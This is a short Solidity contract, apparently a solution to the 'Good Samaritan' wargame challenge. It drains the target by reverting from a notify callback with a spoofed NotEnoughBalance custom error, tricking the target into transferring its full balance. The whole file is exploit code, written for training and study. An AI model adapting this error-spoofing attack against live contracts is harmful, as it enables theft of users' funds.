// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable} from "./GoodSamaritan.sol";

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract GoodSamaritanHacker is INotifyable {


    error NotEnoughBalance();

    function requestDonationFromSamaritan(IGoodSamaritan _samaritan) external {
        IGoodSamaritan(_samaritan).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance(); 
        }
    }
}